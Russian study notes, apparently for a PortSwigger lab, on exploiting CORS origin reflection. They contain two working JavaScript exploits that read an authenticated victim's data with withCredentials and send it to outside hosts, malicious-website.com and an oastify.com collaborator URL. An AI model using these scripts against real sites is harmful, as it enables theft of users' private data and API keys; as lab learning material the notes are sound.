Некоторым приложениям необходимо предоставлять доступ к ряду других доменов. Поддержание списка разрешенных доменов требует постоянных усилий, а любые ошибки могут нарушить функциональность. Поэтому некоторые приложения выбирают легкий путь, фактически разрешая доступ из любого другого домена.

Один из способов сделать это — прочитать заголовок Origin из запросов и включить заголовок ответа, указывающий, что запрашивающий origin разрешен. Например, рассмотрим приложение, которое получает следующий запрос:

```
GET /sensitive-victim-data HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=...
```

Затем он отвечает:
```
HTTP/1.1 200 OK 

Access-Control-Allow-Origin: https://malicious-website.com 
Access-Control-Allow-Credentials: true 
...
```

В этих заголовках указано, что доступ разрешен из запрашивающего домена ( `malicious-website.com`) и что запросы кросс-домены могут включать файлы cookie ( `Access-Control-Allow-Credentials: true`) и поэтому будут обрабатываться в ходе сеанса.

Поскольку приложение отражает произвольные источники в `Access-Control-Allow-Origin`заголовке, это означает, что абсолютно любой домен может получить доступ к ресурсам из уязвимого домена. Если ответ содержит какую-либо конфиденциальную информацию, такую ​​как ключ API или токен CSRF, вы можете получить ее, разместив следующий скрипт на своем веб-сайте:
```
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); 
req.withCredentials = true; 
req.send(); 

function reqListener() 
	{ 
		location='//malicious-website.com/log?key='+this.responseText; 
	};
```
- **Что делает код:**
    1. Создается объект `XMLHttpRequest`, который отправляет GET-запрос на `https://vulnerable-website.com/sensitive-victim-data`.
    
    2. Параметр `withCredentials = true` указывает браузеру включить куки в запрос, если пользователь авторизован на `vulnerable-website.com`.
    
    3. Когда запрос завершается, вызывается функция `reqListener`.
    
    4. В функции `reqListener` данные, полученные от сервера (`this.responseText`), передаются на `malicious-website.com` через URL `//malicious-website.com/log?key=...`.

- **Зачем это нужно:**
    
    - Использовать этот код на своей странице `malicious-website.com`, чтобы украсть конфиденциальные данные пользователя, который посетит эту страницу и будет авторизован на `vulnerable-website.com`.
    
    - Данные передаются на сервер злоумышленника через параметр `key` в URL, где они могут быть записаны и использованы в дальнейшем.


- код с отправкой на другой веб сервер
```
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            var xhr = new XMLHttpRequest();
            var url = "https://ac211f241efad3f2c045255700630006.web-security-academy.net";
            var targetUrl = "https://9z914ntw4dggn6c5y5710c6qyh48s8gx.oastify.com/log";

            xhr.onreadystatechange = function() {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    // Преобразуем ответ в JSON и кодируем в Base64
                    var responseData = JSON.stringify({ response: xhr.responseText });
                    var base64Data = btoa(unescape(encodeURIComponent(responseData)));

                    // Отправляем закодированные данные на целевой сервис
                    fetch(targetUrl + "?key=" + encodeURIComponent(xhr.responseText), {
                        method: 'GET'
                    });
                }
            };

            xhr.open('GET', url + "/accountDetails", true);
            xhr.withCredentials = true;
            xhr.send(null);
        </script>
    </body>
</html>
```
#### Лаба
[[Лабораторная работа Уязвимость CORS с базовым отражением происхождения]]